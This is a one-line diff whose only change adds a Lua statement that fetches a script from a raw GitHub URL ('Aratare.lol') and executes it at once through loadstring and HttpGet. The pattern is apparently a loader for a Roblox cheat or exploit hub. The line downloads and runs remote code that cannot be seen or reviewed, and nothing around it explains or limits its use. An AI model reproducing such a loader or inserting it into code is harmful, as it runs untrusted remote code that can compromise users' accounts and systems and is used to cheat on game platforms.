@@ -1,1 +1,1 @@
-a
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Aratare-official/Aratare.lol/refs/heads/main/main'))()
